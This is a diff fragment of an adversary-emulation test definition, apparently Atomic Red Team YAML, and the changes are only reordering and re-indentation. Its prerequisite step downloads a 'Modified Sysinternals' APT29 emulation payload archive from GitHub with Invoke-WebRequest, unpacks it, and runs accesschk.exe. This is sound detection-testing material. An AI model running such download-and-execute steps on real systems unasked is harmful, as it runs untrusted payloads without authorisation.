       default: $env:TEMP
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Modified Sysinternals must be located at #{file_path}
-      prereq_command: |
-        if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
-        Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
-        Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
-
+  - description: |
+      Modified Sysinternals must be located at #{file_path}
+    prereq_command: |
+      if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+      Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
+      Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       Set-Location -path "#{file_path}\Sysinternals";
       ./accesschk.exe -accepteula .;
+    cleanup_command: 'Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction Ignore'
+    name: powershell
 
-    cleanup_command: |
-      Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction Ignore
